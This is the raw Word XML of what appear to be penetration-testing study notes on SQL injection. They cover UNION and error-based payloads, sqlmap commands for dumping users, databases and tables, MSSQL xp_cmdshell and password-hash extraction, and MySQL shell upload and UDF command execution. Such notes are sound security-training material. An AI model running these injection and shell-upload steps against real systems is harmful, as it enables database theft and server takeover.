          <w:ilvl w:val="1"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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UNION select ‘placeholder’ , 1; -- -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000064C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="144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Select @@version</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000064D">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9s478vj53dwl" w:id="235"/>
        <w:bookmarkEnd w:id="235"/>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Error based sql injection</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000064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br w:type="textWrapping"/>
          <w:t xml:space="preserve">→ forcing an error through advanced sql command, exploit how db calls functions</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000064F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0"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bizsubfeo71f" w:id="236"/>
        <w:bookmarkEnd w:id="23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SQLMap</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000650">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f3sgbk7u8zu" w:id="237"/>
        <w:bookmarkEnd w:id="237"/>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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065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Eg. Union</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065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Sqlmap -u ‘</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:instrText xml:space="preserve">HYPERLINK "http://some"</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http://some</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.com/v.php?id=1’ -p id --technique=U</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065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Parameter → id</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065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55">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uj1r0r5icph0" w:id="238"/>
        <w:bookmarkEnd w:id="23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POST</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065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Sqlmap -u ‘</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:instrText xml:space="preserve">HYPERLINK "http://some"</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http://som</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:fldChar w:fldCharType="end"/>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e.com/v.php’ --data=&lt;POST&gt; -p  param  --technique=U</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000657">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xwmjk1uv0slc" w:id="239"/>
        <w:bookmarkEnd w:id="239"/>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STEPS</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000658">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Banner → --banner (gives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report proof)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000659">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Users → --users</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Check if db admin → --is-dbausername=w&amp;password=w&amp;submit=Login</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Extract databases → --dbs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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 tables from a specific db → -D databasename --tables</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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Chose tables (list) columns → -D dbname -T table1,table2,table3 --columns</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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DATA → -D dbname -T table1,table2,table3 -C col1,col2,col3 --dump</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000065F">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--string to account for true outputs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066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--not-string to account for false</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066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6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Union test</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066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 UNION SELECT ‘els’, ‘els’, etc; -- -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066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6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--level</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000666">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>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Tests cookies (2)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000667">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>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Useragent (3)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000668">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>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Host (5)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066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--risk</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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2 heavy time based</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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3 enables or based injections</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066C">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--keep-alive </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="113"/>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Persistent connection when dumping</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066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--threads</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000066F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="135"/>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Reduce dumping phase time</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000670">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71">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72">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none"/>
          <w:shd w:fill="auto" w:val="clear"/>
          <w:vertAlign w:val="baseline"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:bookmarkStart w:colFirst="0" w:colLast="0" w:name="_gft79m285owr" w:id="240"/>
        <w:bookmarkEnd w:id="240"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000673">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gft79m285owr" w:id="240"/>
        <w:bookmarkEnd w:id="240"/>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Exploiting</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000674">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Getting password hash</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000067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Select name, password FROM master..sysxlogins (mssql) etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000067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 the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 sa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user ; xp_cmdshell</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000677">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Port scanning , using openrowset </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000678">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79">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file , create table on local with file</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000067A">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From victim db, retrieve from local server</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000067B">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7C">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="16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o7x7i3aymbea" w:id="241"/>
        <w:bookmarkEnd w:id="241"/>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MySQL</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000067D">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Uploading shell binaries,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000067E">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Need to convert to a hex string (into dumpfile → hex conversion)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000067F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="132"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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Have to create file on local machine and load into a table</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000680">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="132"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0"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Upload content of file (created by dumpfile ) into victim table, has to be 1024 byte splits (concat contents)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000681">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="132"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="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Write to file target into a dumpfile</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000682">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83">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To execute function have to use, UDF (user defined functions)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000684">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="79"/>
        </w:numPr>
        <w:spacing w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:eastAsia="Roboto" w:hAnsi="Roboto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins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Select sys_eval(‘command’);</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000685">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86">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:spacing w:before="200" w:line="312"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87">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="320" w:lineRule="auto"/>
        <w:jc w:val="center"/>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8dgpmk5yxrcc" w:id="242"/>
        <w:bookmarkEnd w:id="242"/>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LABSSTUFF</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000688">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="120" w:line="276" w:lineRule="auto"/>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bookmarkStart w:colFirst="0" w:colLast="0" w:name="_6kjfuymgankc" w:id="243"/>
        <w:bookmarkEnd w:id="243"/>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Julian’s shit notes </w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000689">
      <w:pPr>
        <w:widowControl w:val="1"/>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8A">
      <w:pPr>
        <w:widowControl w:val="1"/>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fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:instrText xml:space="preserve">HYPERLINK "https://drive.google.com/open?id=13OLXj_QqSzv5BP2kwO88XwuK3-Md4ImK"</w:instrText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:fldChar w:fldCharType="separate"/>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 xml:space="preserve">https://drive.google.com/open?id=13OLXj_QqSzv5BP2kwO88XwuK3-Md4ImK</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000068B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:rPr>
          <w:ins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ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000068C">
      <w:pPr>
        <w:ind w:right="0"/>
        <w:rPr>
          <w:ins w:author="ARWA" w:id="10" w:date="2019-06-18T10:28:24Z"/>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Change w:author="Anonymous" w:id="0" w:date="2019-06-29T08:55:55Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:author="Burning Apollo" w:id="9" w:date="2019-09-26T18:16:18Z">
        <w:del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tab/>
          </w:r>
        </w:del>
      </w:ins>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
      <w:ins w:author="ARWA" w:id="10" w:date="2019-06-18T10:28:24Z">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000068D">
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:author="" w:id="13"/>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Change w:author="Burning Apollo" w:id="0" w:date="2019-09-26T18:11:59Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:author="Anonymous" w:id="12" w:date="2019-05-31T12:27:56Z">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">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flovs</w:delTex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delText xml:space="preserve">l</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
      <w:ins w:author="" w:id="13">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000068E">
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:author="" w:id="15"/>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Change w:author="Burning Apollo" w:id="0" w:date="2019-09-26T18:11:59Z">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center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:author="" w:id="15">
        <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
          <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
            <w:rPr>
              <w:rtl w:val="0"/>
            </w:rPr>
          </w:r>
        </w:del>
      </w:ins>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del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:b w:val="1"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:b w:val="1"/>
              <w:sz w:val="48"/>
              <w:szCs w:val="48"/>
              <w:highlight w:val="white"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:sz w:val="48"/>
            <w:szCs w:val="48"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:b w:val="1"/>
                <w:sz w:val="48"/>
                <w:szCs w:val="48"/>
                <w:highlight w:val="white"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Windows Post-Exploitation </w:delText>
        </w:r>
      </w:del>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b w:val="1"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:b w:val="1"/>
              <w:sz w:val="48"/>
              <w:szCs w:val="48"/>
              <w:highlight w:val="white"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:sz w:val="48"/>
            <w:szCs w:val="48"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:b w:val="1"/>
                <w:sz w:val="48"/>
                <w:szCs w:val="48"/>
                <w:highlight w:val="white"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">Command Execution </w:delText>
        </w:r>
      </w:del>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sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
              <w:highlight w:val="white"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="white"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">If for any  you cannot access/edit these files in the future, please contact</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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color w:val="000099"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:color w:val="000099"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
              <w:highlight w:val="white"/>
              <w:u w:val="single"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:color w:val="1155cc"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:color w:val="1155cc"/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="white"/>
                <w:u w:val="single"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">mubix@hak5.org</w:delText>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:del>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sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
              <w:highlight w:val="white"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
            <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
                <w:highlight w:val="white"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">You can download these files in any format using Google Doc’s</w:delText>
        </w:r>
      </w:del>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sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:highlight w:val="white"/>
          <w:u w:val="single"/>
          <w:rPrChange w:author="Anonymous" w:id="3" w:date="2019-11-04T09:54:30Z">
            <w:rPr>
              <w:sz w:val="28"/>
